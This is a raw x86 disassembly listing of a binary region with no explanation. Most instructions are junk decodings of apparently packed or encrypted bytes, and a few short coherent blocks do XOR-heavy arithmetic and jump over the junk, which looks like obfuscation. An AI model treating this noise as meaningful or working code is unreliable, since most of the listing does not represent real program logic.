  40fc8f:	cmp    ebp,ebp
  40fc91:	inc    ecx
  40fc92:	cmp    BYTE PTR [edx+eiz*1-0x15],cl
  40fc96:	call   0x47a4:0x9dae776e
  40fc9d:	test   DWORD PTR [edx],ebx
  40fc9f:	int    0xcc
  40fca1:	es fcomip st,st(6)
  40fca4:	pop    ss
  40fca5:	(bad)  
  40fca6:	stos   DWORD PTR es:[edi],eax
  40fca7:	sub    BYTE PTR [edi],0x8d
  40fcaa:	mov    ebp,edx
  40fcac:	mov    ecx,0x8ca912cb
  40fcb1:	sbb    edi,esi
  40fcb3:	(bad)  
  40fcb4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fcb5:	cli    
  40fcb6:	sbb    al,0xd5
  40fcb8:	fnstsw WORD PTR [esi]
  40fcba:	inc    ecx
  40fcbb:	fsubr  QWORD PTR [edi-0x5]
  40fcbe:	call   0xf562:0xc300bf33
  40fcc5:	push   cs
  40fcc6:	shl    BYTE PTR [ebp-0x321fd13],1
  40fccc:	mov    al,0xa2
  40fcce:	ins    DWORD PTR es:[edi],dx
  40fccf:	add    dl,BYTE PTR [edx+0xd2269bb]
  40fcd5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fcd6:	cmp    ah,cl
  40fcd8:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  40fcda:	ja     0x40fd40
  40fcdc:	into   
  40fcdd:	std    
  40fcde:	inc    eax
  40fcdf:	adc    eax,0x6887e1c4
  40fce4:	adc    dh,BYTE PTR ds:0xe3031194
  40fcea:	mov    esp,0x799e4b8f
  40fcef:	pop    edx
  40fcf0:	and    ebp,DWORD PTR [eax+0x42957693]
  40fcf6:	inc    edx
  40fcf7:	add    eax,0xdf6aef5e
  40fcfc:	mov    eax,0x420afd4c
  40fd01:	shl    BYTE PTR [edi-0x763f7a3c],cl
  40fd07:	ret    0x208a
  40fd0a:	pop    esi
  40fd0b:	push   ecx
  40fd0c:	cld    
  40fd0d:	push   ebx
  40fd0e:	lahf   
  40fd0f:	out    dx,eax
  40fd10:	idiv   BYTE PTR [edi-0x2b068a8d]
  40fd16:	sub    eax,0xaab7b47
  40fd1b:	lock nop
  40fd1d:	sub    al,0x54
  40fd1f:	jl     0x40fcff
  40fd21:	and    al,0xe7
  40fd23:	outs   dx,DWORD PTR ds:[esi]
  40fd24:	gs rcl ecx,cl
  40fd27:	sub    BYTE PTR ds:0x679a9f45,0x50
  40fd2e:	out    dx,eax
  40fd2f:	fisub  WORD PTR [ebx+0x499e236d]
  40fd35:	(bad)  
  40fd38:	(bad)  
  40fd39:	pop    edx
  40fd3a:	retf   
  40fd3b:	mov    ah,0xce
  40fd3d:	stc    
  40fd3e:	or     esp,DWORD PTR [eax-0x37b8221b]
  40fd44:	adc    DWORD PTR [edx+0x7f0a1c7],eax
  40fd4a:	ss mov ah,0x54
  40fd4d:	xlat   BYTE PTR ds:[ebx]
  40fd4e:	adc    ebp,esp
  40fd50:	jbe    0x40fcf4
  40fd52:	cs dec eax
  40fd54:	push   0xec011817
  40fd59:	sub    ebp,ecx
  40fd5b:	cmp    BYTE PTR [ebp+0x67],cl
  40fd5e:	fsub   QWORD PTR [ecx+0x1fa7610e]
  40fd64:	pop    esi
  40fd65:	rcl    BYTE PTR [ebx+ecx*2],1
  40fd68:	imul   ebp,ecx,0xfffffffd
  40fd6b:	gs xchg esi,eax
  40fd6d:	repz inc esp
  40fd6f:	xor    ch,bl
  40fd71:	pop    edi
  40fd72:	hlt    
  40fd73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fd74:	aaa    
  40fd75:	pop    edx
  40fd76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fd77:	push   ss
  40fd78:	fsub   DWORD PTR [esi-0x4]
  40fd7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fd7c:	inc    edi
  40fd7d:	inc    edi
  40fd7e:	or     al,ch
  40fd80:	out    dx,eax
  40fd81:	xor    ah,BYTE PTR [edx]
  40fd83:	and    eax,0x62fc7d2f
  40fd88:	test   DWORD PTR gs:[ebx*8+0xe528966],eax
  40fd90:	add    eax,0x27bb09d4
  40fd95:	ss mov dh,0x35
  40fd98:	div    DWORD PTR [edx+0x65]
  40fd9b:	gs loop 0x40fdce
  40fd9e:	test   bl,0x5d
  40fda1:	cli    
  40fda2:	add    eax,0xd669e13e
  40fda7:	sbb    edx,esi
  40fda9:	sbb    eax,0x2bb6b2d3
  40fdae:	add    BYTE PTR [edx+eiz*4],cl
  40fdb1:	cmovbe esp,DWORD PTR [ebx]
  40fdb4:	std    
  40fdb5:	lods   eax,DWORD PTR ds:[esi]
  40fdb6:	(bad)  
  40fdb7:	scas   al,BYTE PTR es:[edi]
  40fdb8:	(bad)
  40fdbb:	repnz fld TBYTE PTR [ebx+0x5bcde12b]
  40fdc2:	adc    bh,BYTE PTR [eax+0x6]
  40fdc5:	jmp    0xa7ca:0x7a8534ca
  40fdcc:	xchg   ecx,eax
  40fdcd:	mov    bh,0xcb
  40fdcf:	out    0x81,al
  40fdd1:	sbb    ch,BYTE PTR [esi+0x40bfda49]
  40fdd7:	or     BYTE PTR [eax],cl
  40fdd9:	test   eax,0xbae8bc48
  40fdde:	pop    edx
  40fddf:	push   cs
  40fde0:	es jle 0x40fe01
  40fde3:	add    eax,0x808eacab
  40fde8:	or     eax,ecx
  40fdea:	mov    ecx,DWORD PTR [ebp-0x20]
  40fded:	mov    ecx,DWORD PTR [ebp-0x1c]
  40fdf0:	and    edx,0x76f2
  40fdf6:	or     edx,edi
  40fdf8:	xor    edx,esi
  40fdfa:	xor    eax,0x253b
  40fdff:	shld   edx,eax,0x2
  40fe03:	shl    eax,0x2
  40fe06:	shr    ecx,0x1e
  40fe09:	xor    esi,esi
  40fe0b:	or     eax,ecx
  40fe0d:	or     edx,esi
  40fe0f:	xor    eax,0xcb79b576
  40fe14:	mov    DWORD PTR [ebp-0x20],eax
  40fe17:	mov    esi,0x9c2b8ae8
  40fe1c:	xor    edx,esi
  40fe1e:	mov    DWORD PTR [ebp-0x1c],edx
  40fe21:	mov    eax,DWORD PTR [ebp-0x38]
  40fe24:	mov    ecx,DWORD PTR [ebp-0x34]
  40fe27:	mov    edx,DWORD PTR [ebp-0x40]
  40fe2a:	mov    edi,DWORD PTR [ebp-0x3c]
  40fe2d:	push   edi
  40fe2e:	push   edx
  40fe2f:	push   ecx
  40fe30:	push   eax
  40fe31:	call   0x41594e
  40fe36:	add    eax,0x536a
  40fe3b:	adc    edx,0x9573
  40fe41:	push   0x12613
  40fe46:	push   0xae21daec
  40fe4b:	push   edx
  40fe4c:	push   eax
  40fe4d:	call   0x422283
  40fe52:	mov    ecx,eax
  40fe54:	mov    eax,DWORD PTR [ebp-0x20]
  40fe57:	mov    ebx,DWORD PTR [ebp-0x1c]
  40fe5a:	xor    ecx,0x1b8b
  40fe60:	xor    edi,edi
  40fe62:	xor    edx,edi
  40fe64:	add    ecx,eax
  40fe66:	mov    eax,DWORD PTR [ebp+0xc]
  40fe69:	adc    edx,ebx
  40fe6b:	mov    DWORD PTR [eax],ecx
  40fe6d:	mov    DWORD PTR [eax+0x4],edx
  40fe70:	mov    eax,DWORD PTR [ebp-0x30]
  40fe73:	mov    ecx,DWORD PTR [ebp-0x2c]
  40fe76:	mov    edx,0xbdb2
  40fe7b:	sub    edx,eax
  40fe7d:	jmp    0x410231
  40fe82:	(bad)  
  40fe83:	out    dx,eax
  40fe84:	ins    BYTE PTR es:[edi],dx
  40fe85:	and    BYTE PTR [esp+edi*4+0x3f7f08b],bh
  40fe8c:	or     bh,0x3d
  40fe8f:	mov    DWORD PTR [eax-0x41d35b31],eax
  40fe95:	mov    esi,0xbebec4e3
  40fe9a:	push   ss
  40fe9b:	retf   0xc1c3
  40fe9e:	push   0x4e
  40fea0:	xchg   esp,eax
  40fea1:	cmp    eax,0xb8efee0c
  40fea6:	sub    bh,BYTE PTR [ecx]
  40fea8:	and    DWORD PTR [eax-0x19],eax
  40feab:	fistp  QWORD PTR [ebx-0x43]
  40feae:	inc    edi
  40feaf:	sub    BYTE PTR [esi-0x6775c2bb],dh
  40feb5:	sbb    ch,BYTE PTR [esi+0x8]
  40feb8:	mov    ds:0xb53faa68,al
  40febd:	out    dx,al
  40febe:	sbb    ebx,esp
  40fec0:	fwait
  40fec1:	jl     0x40ff41
  40fec3:	fstp   DWORD PTR [ebx]
  40fec5:	jbe    0x40ff25
  40fec7:	push   0x21
  40fec9:	pop    ss
  40feca:	pop    esi
  40fecb:	mov    ds:0xe53b813d,al
  40fed0:	or     ah,BYTE PTR [eax]
  40fed2:	icebp  
  40fed3:	icebp  
  40fed4:	stc    
  40fed5:	cwde   
  40fed6:	imul   edi,eax,0x58688864
  40fedc:	sbb    BYTE PTR [edx-0x61e7422b],dh
  40fee2:	dec    ebp
  40fee3:	loopne 0x40feac
  40fee5:	jl     0x40feb5
  40fee7:	sub    eax,0xb0770687
  40feec:	test   eax,0x1a85e188
  40fef1:	add    BYTE PTR [ecx+eiz*2-0x2d],al
  40fef5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fef6:	inc    ecx
  40fef7:	mov    ebp,DWORD PTR [ecx+0x58]
  40fefa:	cmp    dh,ah
  40fefc:	(bad)  
  40fefd:	fist   WORD PTR [edx]
  40feff:	(bad)  
  40ff00:	stos   BYTE PTR es:[edi],al
  40ff01:	sub    al,0x82
  40ff03:	or     esi,DWORD PTR [edi+0x41b40e5e]
  40ff09:	xchg   ah,al
  40ff0b:	sub    edx,DWORD PTR [ebp+0x5b663b6]
  40ff11:	outs   dx,BYTE PTR ds:[esi]
  40ff12:	in     eax,dx
  40ff13:	aam    0x1e
  40ff15:	xchg   ebp,eax
  40ff16:	bound  ebp,QWORD PTR [esi]
  40ff18:	fmul   st(4),st
  40ff1a:	out    0xb6,eax
  40ff1c:	gs retf 
  40ff1e:	jb     0x40fedc
  40ff20:	mov    es,WORD PTR [edx-0x5a27f88e]
  40ff26:	(bad)  
  40ff27:	leave  
  40ff28:	mov    al,ds:0x46ee68bf
  40ff2d:	or     ebp,DWORD PTR [ebx]
  40ff2f:	mov    ebp,DWORD PTR [ebp-0x5f]
  40ff32:	dec    edx
  40ff33:	push   ebp
  40ff34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ff35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff36:	test   al,0x45
  40ff38:	and    cl,0x79
  40ff3b:	call   0xd700b6e5
  40ff40:	xor    bl,ah
  40ff42:	ins    DWORD PTR es:[edi],dx
  40ff43:	cmp    ebx,edx
  40ff45:	je     0x40ff32
  40ff47:	mov    eax,0x2fb2a061
  40ff4c:	ins    DWORD PTR es:[edi],dx
  40ff4d:	mov    ebp,0x94cf9920
  40ff52:	dec    esi
  40ff53:	iret   
  40ff54:	(bad)  
  40ff55:	lahf   
  40ff56:	mov    cs,WORD PTR [ecx]
  40ff58:	inc    edx
  40ff59:	fiadd  DWORD PTR [esi-0x3417d310]
  40ff5f:	sub    eax,0x7b885721
  40ff64:	mov    al,0x85
  40ff66:	pop    edx
  40ff67:	pop    ds
  40ff68:	imul   ebp,DWORD PTR [ebp-0x61],0x48
  40ff6c:	lock cli 
  40ff6e:	cmp    cl,bh
  40ff70:	xchg   esi,eax
  40ff71:	mov    al,0xc
  40ff73:	sub    dh,BYTE PTR [ebp+0x31]
  40ff76:	cdq    
  40ff77:	sar    BYTE PTR ds:0xa16d0db0,1
  40ff7d:	pop    es
  40ff7e:	ins    BYTE PTR es:[edi],dx
  40ff7f:	pushf  
  40ff80:	test   cl,0xf3
  40ff83:	and    bh,dl
  40ff85:	jge    0x40ffbf
  40ff87:	pop    esi
  40ff88:	add    BYTE PTR [esi],dl
  40ff8a:	jmp    0x40ff5b
  40ff8c:	dec    ebp
  40ff8d:	sbb    ebp,edi
  40ff8f:	pop    eax
  40ff90:	(bad)  
  40ff94:	xor    dh,BYTE PTR [esi-0xc5e2e2b]
  40ff9a:	iret   
  40ff9b:	imul   esp,DWORD PTR [ebp+0x2f2bfa6b],0xb8fc41ae
  40ffa5:	out    0x41,eax
  40ffa7:	or     eax,0x982faff9
  40ffac:	mov    edx,0x8521b24b
  40ffb1:	arpl   ax,di
  40ffb3:	xor    al,al
  40ffb5:	shl    DWORD PTR [eax-0x2c],cl
  40ffb8:	je     0x40ff65
  40ffba:	pop    ebp
  40ffbb:	mov    ebp,ecx
  40ffbd:	loopne 0x40ff63
  40ffbf:	test   eax,0x739746a5
  40ffc4:	fnstsw WORD PTR [esi-0x348907ef]
  40ffca:	mov    eax,0xa126564a
  40ffcf:	lock stos BYTE PTR es:[edi],al
  40ffd1:	push   ecx
  40ffd2:	(bad)  
  40ffd3:	call   0x1e5f6449
  40ffd8:	and    edx,DWORD PTR [eax+0x6]
  40ffdb:	leave  
  40ffdc:	daa    
  40ffdd:	mov    esi,0x99fd9278
  40ffe2:	push   ebx
  40ffe3:	dec    edi
  40ffe4:	jecxz  0x40ffc3
  40ffe6:	inc    ebp
  40ffe7:	lea    ebx,[ecx]
  40ffe9:	shl    DWORD PTR ds:0xd0abe4b7,cl
  40ffef:	scas   al,BYTE PTR es:[edi]
  40fff0:	cli    
  40fff1:	xor    al,0x33
  40fff3:	dec    edx
  40fff4:	jmp    0x3f46bb3c
  40fff9:	sub    BYTE PTR [edi-0xd326939],ah
  40ffff:	mov    edi,esi
  410001:	sti    
  410002:	int    0x31
  410004:	adc    edx,DWORD PTR [edx+0x72]
  410007:	mov    ah,0xea
  410009:	push   ds
  41000a:	jne    0x40fffa
  41000c:	and    eax,0x661500e
  410011:	mov    cl,0x9c
  410013:	loop   0x410070
  410015:	add    esp,DWORD PTR [edx]
  410017:	mov    cl,0x57
  410019:	mov    ah,0x6d
  41001b:	ins    BYTE PTR es:[edi],dx
  41001c:	dec    ecx
  41001d:	jge    0x40ffc4
  41001f:	mov    bh,0xe
  410021:	xor    al,0xd
  410023:	mov    WORD PTR es:[ecx+0x57],?
  410027:	xchg   ecx,eax
  410028:	cmp    al,BYTE PTR [eax]
  41002a:	xor    al,0x94
  41002c:	adc    BYTE PTR [esi],bl
  41002e:	pop    eax
  41002f:	xor    BYTE PTR [edx-0x28b37cc4],al
  410035:	or     edx,eax
  410037:	and    bl,BYTE PTR [ebp-0x257c6736]
  41003d:	dec    edx
  41003e:	test   DWORD PTR [ecx-0x656071c8],esp
  410044:	xchg   ecx,eax
  410045:	jecxz  0x410024
  410047:	pop    ss
  410048:	xlat   BYTE PTR ds:[ebx]
  410049:	ficomp DWORD PTR [edi]
  41004b:	jge    0x410090
  41004d:	dec    ebx
  41004e:	xor    eax,0x9dcca508
  410053:	jge    0x4100a0
  410055:	nop
  410056:	out    0xbe,eax
  410058:	icebp  
  410059:	shl    DWORD PTR [ecx+0x1ce9db51],1
  41005f:	into   
  410060:	jecxz  0x40fff7
  410062:	jb     0x4100d8
  410064:	push   edx
  410065:	clc    
  410066:	retf   
  410067:	inc    edx
  410068:	jns    0x4100c0
  41006a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41006b:	push   ebx
  41006c:	add    al,0x26
  41006e:	daa    
  41006f:	inc    ecx
  410070:	js     0x41007d
  410072:	jae    0x41005b
  410074:	out    0x9e,al
  410076:	in     eax,0x8
  410078:	jecxz  0x41006c
  41007a:	rol    DWORD PTR [edi],0xe4
  41007d:	xchg   ebp,eax
  41007e:	cmp    DWORD PTR [esi],ecx
  410080:	mov    ecx,eax
  410082:	adc    DWORD PTR [ebp-0x12],edi
  410085:	push   0xffffffd8
  410087:	jmp    0x70c90c43
  41008c:	lock popf 
  41008e:	je     0x41010d
  410090:	mov    bl,0x58
  410092:	test   eax,0xc7ad4ce1
  410097:	pop    edi
  410098:	sbb    DWORD PTR [edx+0xd],ecx
  41009b:	xchg   ebx,eax
  41009c:	mov    cl,0xf8
  41009e:	popf   
  41009f:	sub    bh,BYTE PTR [eax+0x2dec30dd]
  4100a5:	push   cs
  4100a6:	xchg   edi,eax
  4100a7:	add    edx,DWORD PTR [ebx]
  4100a9:	ins    BYTE PTR es:[edi],dx
  4100aa:	sahf   
  4100ab:	dec    edx
  4100ac:	loopne 0x41010f
  4100ae:	xchg   ebx,eax
  4100af:	adc    eax,0xd08d7929
  4100b4:	test   DWORD PTR ds:0xd5f9ac8c,ecx
  4100ba:	mov    dl,0x1d
  4100bc:	jo     0x4100f1
  4100be:	das    
  4100bf:	push   edi
  4100c0:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  4100c2:	push   ebx
  4100c3:	outs   dx,DWORD PTR ds:[esi]
  4100c4:	xchg   edi,eax
  4100c5:	push   ss
  4100c6:	dec    ebx
  4100c7:	add    bl,al
  4100c9:	push   ebx
  4100ca:	push   ecx
  4100cb:	popa   
  4100cc:	or     eax,0xeb7c56aa
  4100d1:	ja     0x410100
  4100d3:	cwde   
  4100d4:	or     DWORD PTR [ebx-0x126240a0],esp
  4100da:	xchg   edx,eax
  4100db:	in     eax,0x29
  4100dd:	mov    ecx,0x90a12c91
  4100e2:	xor    eax,0x376bc888
  4100e7:	xchg   ecx,eax
  4100e8:	jmp    DWORD PTR [ecx]
  4100ea:	and    ch,ch
  4100ec:	shl    DWORD PTR [edi+edx*4],0x20
  4100f0:	xor    eax,0x25e54a42
  4100f5:	sbb    ch,bl
  4100f7:	out    0x1a,eax
  4100f9:	jp     0x410089
  4100fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4100fc:	(bad)  
  4100fd:	add    al,0xec
  4100ff:	stos   BYTE PTR es:[edi],al
  410100:	or     eax,0x68c3d068
  410105:	imul   esp,DWORD PTR [edi-0x5b],0xfffffff7
  410109:	lea    edx,[eax]
  41010b:	dec    eax
  41010c:	aad    0xbf
  41010e:	dec    esi
  41010f:	pop    edi
  410110:	mov    bh,al
  410112:	fprem1 
  410114:	gs xor cl,ch
  410117:	add    al,0xb4
  410119:	or     bh,dl
  41011b:	sbb    DWORD PTR [ebx+0x63],ecx
  41011e:	popa   
  41011f:	ja     0x4100bd
  410121:	sbb    ah,bh
  410123:	lahf   
  410124:	and    ch,BYTE PTR [edx+0x43]
  410127:	fisub  WORD PTR fs:[edi-0x50]
  41012b:	das    
  41012c:	adc    DWORD PTR [edx-0x37637fcd],esp
  410132:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410133:	cmp    bl,ch
  410135:	and    al,0xca
  410137:	and    edi,DWORD PTR [esi+0x4a5988c4]
  41013d:	mov    ebx,esi
  41013f:	outs   dx,DWORD PTR ds:[esi]
  410140:	int3   
  410141:	sub    BYTE PTR [eax],dh
  410143:	enter  0x7238,0xfc
  410147:	and    BYTE PTR [eax],cl
  410149:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41014a:	mov    gs,WORD PTR [ecx-0x51]
  41014d:	add    BYTE PTR [ecx+0x42813ae6],dh
  410153:	aas    
  410154:	mov    bh,0xa4
  410156:	fldcw  WORD PTR [ebx+0x1c]
  410159:	and    BYTE PTR [ecx+0x2ef03170],dl
  41015f:	fwait
  410160:	dec    esp
  410161:	push   ss
  410162:	lahf   
  410163:	call   0xc9c5:0x4e7be33c
  41016a:	pop    ebp
  41016b:	in     al,0x12
  41016d:	popa   
  41016e:	mov    eax,ds:0x87e0cf1
  410173:	jmp    0x5cb:0x6a300ff8
  41017a:	sbb    BYTE PTR [ebx+0x7a],dl
  41017d:	jmp    0xbfc3fa8c
  410182:	test   al,0x10
  410184:	or     esp,DWORD PTR [ebx-0xb]
  410187:	shr    BYTE PTR [edx+0x2d],cl
  41018a:	std    
  41018b:	cmp    DWORD PTR [edi+0x35],esp
  41018e:	pop    ss
  41018f:	jmp    0x295f93df
  410194:	je     0x410185
  410196:	dec    edi
  410197:	mov    bh,0x31
  410199:	mov    bl,0xe6
  41019b:	xor    DWORD PTR [esi+0x3775baa3],0xffffffa6
  4101a2:	fild   WORD PTR ds:0x76642e63
  4101a8:	(bad)  [ebx+eax*8-0x4b18da13]
  4101af:	or     BYTE PTR [esi+0x56],ch
  4101b2:	mov    esi,0x263af4b0
  4101b7:	pushfw 
  4101b9:	test   ah,bl
  4101bb:	sahf   
  4101bc:	stos   BYTE PTR es:[edi],al
  4101bd:	cmp    DWORD PTR ds:0xfa451ecb,eax
  4101c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4101c4:	pushf  
  4101c5:	sub    ah,BYTE PTR [ebp-0x566847a]
  4101cb:	push   cs
  4101cc:	mov    eax,ds:0xccd824a4
  4101d1:	ins    BYTE PTR es:[edi],dx
  4101d2:	dec    edi
  4101d3:	out    0x97,eax
  4101d5:	jmp    0xdcc4:0x2a2db114
  4101dc:	mov    al,ds:0x93ca07cf
  4101e1:	mov    ebx,0xc7400453
  4101e6:	cwde   
  4101e7:	test   DWORD PTR [ebx+0x50611c09],ecx
  4101ed:	jecxz  0x410248
  4101ef:	enter  0xdf68,0x79
  4101f3:	aam    0x38
  4101f5:	sbb    bh,bl
  4101f7:	mov    gs,WORD PTR ds:0xa85cecf7
  4101fd:	pop    ebp
  4101fe:	inc    eax
  4101ff:	neg    BYTE PTR [ebx+eiz*8+0x76]
  410203:	push   ebx
  410204:	pop    es
  410205:	and    ecx,DWORD PTR [ecx-0x28]
  410208:	cmp    BYTE PTR [esi-0x6f],dh
  41020b:	imul   edx,ebx,0x450f6668
  410211:	popa   
  410212:	not    DWORD PTR [esp+ebp*4]
  410215:	frstor [esp+eiz*4]
  410218:	stos   BYTE PTR es:[edi],al
  410219:	out    0x3a,al
  41021b:	mov    ecx,0xac1ab491
  410220:	mov    ebx,0x5815b78
  410225:	das    
  410226:	xchg   edi,eax
  410227:	push   es
  410228:	(bad)  
  410229:	daa    
  41022a:	ins    DWORD PTR es:[edi],dx
  41022b:	iret   
  41022c:	pop    edi
  41022d:	sub    eax,DWORD PTR [ebx+ecx*4-0x27ba74be]
  410234:	mov    ebx,0x4c02
  410239:	sbb    ebx,ecx
  41023b:	mov    ecx,DWORD PTR [ebp-0x24]
  41023e:	sub    edx,eax
  410240:	mov    eax,DWORD PTR [ebp+0xc]
  410243:	sbb    ebx,ecx
  410245:	add    edx,DWORD PTR [eax]
  410247:	mov    ecx,DWORD PTR [ebp-0x28]
  41024a:	adc    ebx,DWORD PTR [eax+0x4]
  41024d:	push   0x2
  41024f:	xor    ebx,esi
  410251:	mov    esi,DWORD PTR [ebp-0x24]
  410254:	pop    esi
  410255:	sub    esi,ecx
  410257:	mov    ecx,DWORD PTR [ebp-0x30]
  41025a:	sub    esi,ecx
  41025c:	mov    eax,ebx
  41025e:	jmp    0x410612
  410263:	sub    DWORD PTR [esi-0x65853526],eax
  410269:	cmp    DWORD PTR [esi-0x6df308e8],esp
  41026f:	lds    edx,FWORD PTR [ebx+0x4a]
  410272:	xchg   edx,eax
  410273:	leave  
  410274:	xor    al,0xbe
  410276:	mov    esi,0xbebec4e3
  41027b:	cmp    BYTE PTR [eax],ah
  41027d:	sti    
  41027e:	ficom  DWORD PTR [ecx+0x11]
  410281:	dec    BYTE PTR [ebx-0x702129c0]
  410287:	cmp    bl,dl
  410289:	jno    0x41023c
  41028b:	cli    
  41028c:	lahf   
  41028d:	xchg   ebx,eax
  41028e:	mul    DWORD PTR [ebx]
  410290:	jg     0x410252
  410292:	dec    esp
  410293:	push   ebp
  410294:	pop    esp
  410295:	lods   al,BYTE PTR ds:[esi]
  410296:	stos   DWORD PTR es:[edi],eax
  410297:	pop    ecx
  410298:	stos   DWORD PTR es:[edi],eax
  410299:	(bad)  
  41029a:	xchg   ecx,eax
  41029b:	test   BYTE PTR [eax-0x21],al
  41029e:	cmp    ebx,DWORD PTR [edx-0x14c7ebe7]
  4102a4:	mov    edx,0x6947249a
  4102a9:	jo     0x4102fe
  4102ab:	adc    BYTE PTR [esi-0x5d],bl
  4102ae:	out    0xcb,al
  4102b0:	dec    edx
  4102b1:	inc    eax
  4102b2:	lods   eax,DWORD PTR ds:[esi]
  4102b3:	pop    DWORD PTR [ecx+ecx*4+0x68]
  4102b7:	out    dx,eax
  4102b8:	aad    0x8b
  4102ba:	adc    al,0x6
  4102bc:	xor    ebx,DWORD PTR [ecx+edi*1+0x5c89ebc6]
  4102c3:	fsubrp st(5),st
  4102c5:	imul   ebx,edi,0xf9b65698
  4102cb:	sub    al,0x86
  4102cd:	punpckhwd mm1,QWORD PTR [ebx-0x4336a7d4]
  4102d4:	aas    
  4102d5:	pop    edx
  4102d6:	jb     0x410312
  4102d8:	push   ebp
  4102d9:	or     BYTE PTR [eax+edi*8],al
  4102dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4102dd:	fbstp  TBYTE PTR [ebp+edi*1+0x5d258c48]
  4102e4:	cmp    bh,bh
  4102e6:	sub    al,0xaa
  4102e8:	mov    ecx,0x7082c7b
  4102ed:	sub    al,0xd6
  4102ef:	jne    0x4102aa
  4102f1:	xor    eax,edx
  4102f3:	add    al,0xf8
  4102f5:	add    BYTE PTR [edx+edx*1],dh
  4102f8:	es xchg ebp,eax
  4102fa:	mov    edi,0x54672589
  4102ff:	pop    ss
  410300:	mov    BYTE PTR [ebx],0xd5
  410303:	imul   ebp,DWORD PTR [edi],0x4
  410306:	push   0x28b3d016
  41030b:	lock mov eax,0x542b020a
  410311:	xor    ebp,DWORD PTR [ebp-0x57885fe3]
  410317:	ins    BYTE PTR es:[edi],dx
  410318:	jge    0x4102fd
  41031a:	icebp  
  41031b:	dec    esi
  41031c:	addr16 jnp 0x41033b
  41031f:	repnz fucomp st(1)
  410322:	aaa    
  410323:	in     eax,dx
  410324:	cdq    
  410325:	rcr    BYTE PTR [eax],1
  410327:	in     al,dx
  410328:	adc    al,0x6d
  41032a:	fisub  DWORD PTR [esi]
  41032c:	xor    DWORD PTR [esi+0x60],ecx
  41032f:	ret    0x6bbc
  410332:	outs   dx,DWORD PTR ds:[esi]
  410333:	sbb    BYTE PTR [ecx+0x5026d78c],ah
  410339:	mov    al,ds:0x554e5c77
  41033e:	sub    edi,ecx
  410340:	push   edx
  410341:	and    edx,DWORD PTR [ebp-0x5fe84d0b]
  410347:	add    esp,DWORD PTR [edx]
  410349:	pop    edi
  41034a:	je     0x4102e7
  41034c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41034d:	lods   al,BYTE PTR ds:[esi]
  41034f:	addr16 xchg esp,eax
  410351:	fld    DWORD PTR [ebp+0x417ae694]
  410357:	jne    0x41030f
  410359:	icebp  
  41035a:	daa    
  41035b:	sbb    DWORD PTR [ecx+0x6c],edx
  41035e:	and    ch,dh
  410360:	loopne 0x4103ad
  410362:	jae    0x41039d
  410364:	shl    BYTE PTR [esi],cl
  410366:	out    0x4c,eax
  410368:	icebp  
  410369:	shl    BYTE PTR [edx+0x7a],cl
  41036c:	push   edx
  41036d:	push   ss
  41036e:	push   ds
  41036f:	push   edi
  410370:	imul   dh
  410372:	ror    ch,0xdf
  410375:	pushf  
  410376:	push   edx
  410377:	xchg   ebx,eax
  410378:	sub    BYTE PTR ds:0xbb204bea,ah
  41037e:	inc    ecx
  41037f:	jno    0x4103cf
  410381:	push   eax
  410382:	fs cmc 
  410384:	(bad)  
  410385:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410386:	xchg   edx,eax
  410387:	addr16 ret 0x20d5
  41038b:	mov    ds:0x304126ab,eax
  410390:	push   0x5e
  410392:	test   BYTE PTR [ecx-0x4a1a259],ch
  410398:	ss loop 0x410393
  41039b:	sub    eax,0xa1483537
  4103a0:	adc    ah,BYTE PTR [eax+edx*2-0x3bd85f21]
  4103a7:	dec    esp
  4103a8:	aad    0x29
  4103aa:	jmp    0xfca6:0x6957a580
  4103b1:	data16 repnz pushw 0xebeb
  4103b7:	push   ebx
  4103b8:	dec    eax
  4103b9:	(bad)  
  4103ba:	test   eax,0xab7872ef
  4103bf:	leave  
  4103c0:	(bad)  
  4103c2:	test   esi,ecx
  4103c4:	xchg   edx,eax
  4103c5:	mov    al,ds:0xb6aee75f
  4103ca:	rol    DWORD PTR [esi-0x7c7801e9],cl
  4103d0:	mov    DWORD PTR [edi],esp
  4103d2:	xor    DWORD PTR [ecx-0x176e113e],esi
  4103d8:	push   edx
  4103d9:	and    al,dh
  4103db:	jp     0x410426
  4103dd:	pushf  
  4103de:	mov    ebx,0xc75057c
  4103e3:	fwait
  4103e4:	add    al,ch
  4103e6:	mov    dh,0x47
  4103e8:	arpl   WORD PTR [ebp+0x1d36d8b4],dx
  4103ee:	(bad)  [edx+0x2a]
  4103f1:	push   esi
  4103f2:	int3   
  4103f3:	xchg   edi,eax
  4103f4:	and    bl,BYTE PTR [edi+0x431fda4a]
  4103fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4103fb:	rol    DWORD PTR ds:0xe8d8f1a5,1
  410401:	or     DWORD PTR [esi-0x3389abec],0xacafb30e
  41040b:	nop
  41040c:	icebp  
  41040d:	jmp    0x4bf9:0x202958ae
  410414:	xchg   BYTE PTR [ecx*2+0x2e1be5bc],ah
  41041b:	retf   
  41041c:	(bad)  
  41041d:	jo     0x4103e6
  41041f:	fisub  WORD PTR [ebx]
  410421:	popa   
  410422:	pusha  
  410423:	xchg   BYTE PTR [esi],bl
  410425:	mov    al,ds:0x8f1813c
  41042a:	mov    eax,ds:0x1cc853a2
  41042f:	not    DWORD PTR [ecx-0x41]
  410432:	mov    ds,WORD PTR [eax-0xb]
  410435:	sub    BYTE PTR [eax-0x1],ch
  410438:	(bad)  
  410439:	xlat   BYTE PTR ds:[ebx]
  41043a:	nop    DWORD PTR [ecx]
